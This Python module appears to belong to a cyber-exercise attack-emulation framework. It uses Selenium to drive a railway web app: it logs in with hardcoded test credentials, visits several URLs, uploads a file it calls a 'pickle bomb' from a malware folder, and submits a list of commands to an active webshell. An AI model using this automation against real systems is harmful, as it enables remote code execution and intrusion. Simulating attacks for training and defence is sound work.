#-----------------------------------------------------------------------------
# Name:        webApp.py
#
# Purpose:     This module will provide different individual actor function/class
#              for the action scheduler, to interact with a webApp.
#
# Author:      Yuancheng Liu, Ponnu Rose Raju
#
# Created:     2025/03/05
# version:     v_0.0.2
# Copyright:   Copyright (c) 2025 LiuYuancheng
# License:     MIT License
#-----------------------------------------------------------------------------

import os
import http
import time
import json
import subprocess
import keyboard
import actionGlobal as gv
import requests

from selenium import webdriver
from selenium.webdriver.common.by import By
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.chrome.service import Service as ChromeService
from webdriver_manager.chrome import ChromeDriverManager

from pynput.keyboard import Controller, Key
from flask import flash


file_name = os.path.basename(gv.UPLOAD_FILE)
#--------------------------------------------------------------------------------------
def accessWeb():
	  
    driver = webdriver.Chrome(service=ChromeService(ChromeDriverManager().install()))
    try:
    	# Open the web application
        driver.get(f"http://{gv.RAILWAY_IP}:5000/index")  
        driver.maximize_window()


        # Wait for the page to load
        time.sleep(3)

        # Simulate Login process
        username_input = driver.find_element(By.NAME, "account")
        password_input = driver.find_element(By.NAME, "password")
        print("Keying login credentials successful")

        username_input.send_keys("bob44")  # Replace with your username
        time.sleep(3)
        password_input.send_keys("bob1234")  # Replace with your password
        time.sleep(3)

        # Simulate pressing Enter
        keyboard = Controller()
        keyboard.press(Key.enter)
        keyboard.release(Key.enter)  

        # Verify login success
        if "index" in driver.current_url:  # Replace with an element or URL to confirm success
            print("Login successful")
        else:
            print("Login failed")  

        # Wait for the page to load
        time.sleep(5)

    except Exception as e:
        print(f"An error occurred: {e}")

    finally:
        # Close the browser
        driver.quit()

#--------------------------------------------------------------------------------------
def urlFuzz():
    try:
        driver = webdriver.Chrome(service=ChromeService(ChromeDriverManager().install()))
        driver.get(f"http://{gv.RAILWAY_IP}:5000/index")
        time.sleep(10) 
        driver.get(f"http://{gv.RAILWAY_IP}:5000/crpass")  
        time.sleep(10)
        """
        with open(gv.UPLOAD_FILE, "rb") as fh:
            response = requests.post(f"http://{gv.RAILWAY_IP}:5000/fileupload", files={"file": (file_name, fh.read())})
            time.sleep(10)
        """
        driver.get(f"http://{gv.RAILWAY_IP}:5000/login")  
        time.sleep(10)
        driver.get(f"http://{gv.RAILWAY_IP}:5000/index") 
        print("Fuzzing some URL and post request done")
    except Exception as e:
        print(f"An error occurred: {e}")
    finally:
        # Close the browser
        driver.quit()

#--------------------------------------------------------------------------------------
def submitCrpass(imageFile):
    try:
        driver = webdriver.Chrome(service=ChromeService(ChromeDriverManager().install()))
        driver.get(f"http://{gv.RAILWAY_IP}:5000/crpass")
        time.sleep(5)
        name_input = driver.find_element(By.ID, "name") 
        email = driver.find_element(By.NAME, "email") 
        phone = driver.find_element(By.NAME, "phone")  

        name_input.send_keys("Bob")
        time.sleep(3)
        email.send_keys("bob_gt@gmail.com")
        time.sleep(3)
        phone.send_keys("+62 12345678")
        time.sleep(3)

        
        if imageFile:
            # Open the file and send it in the POST request
            with open(gv.UPLOAD_FILE, "rb") as fh:
                response = requests.post(f"http://{gv.RAILWAY_IP}:5000/fileupload", files={"file": (file_name, fh.read())})
            # Wait for the page to load
            time.sleep(5)
            print("Image upload successful")   

        else:
            folderPath = "C:\Works\malware01"
            malwareName = "image.txt"
            malwareFile = os.path.join(folderPath,malwareName)
            with open(malwareFile, "rb") as fh:
                response = requests.post(f"http://{gv.RAILWAY_IP}:5000/fileupload", files={"file": (malwareName, fh.read())})

            time.sleep(5)
            print("Uploaded pickle bomb")   

    except Exception as e:
        print(f"File upload failed: {e}")

    finally:
        # Close the browser
        driver.quit()
    
#--------------------------------------------------------------------------------------
def webShellAccess(cmdList):
    try:   
        driver = webdriver.Chrome(service=ChromeService(ChromeDriverManager().install()))
        # Open the web application
        driver.get(f"http://{gv.RAILWAY_IP}:5001/")  # Replace with the login URL
        driver.maximize_window()

        # Wait for the page to load
        time.sleep(3)
        
        for item in cmdList:
            cmdStr = driver.find_element(By.NAME, "cmdContents")
            cmdStr.send_keys(item) 
            time.sleep(5)
            # Find the submit button and click it
            submit_button = driver.find_element(By.TAG_NAME, "button")
            submit_button.click()
            print("Execute '%s' command in the activated webshell" %str(item))

            time.sleep(20)
            cmdStr.clear()

    
    except Exception as e:
        print(f"An error occurred: {e}")

    finally:
        # Close the browser
        driver.quit()

#--------------------------------------------------------------------------------------

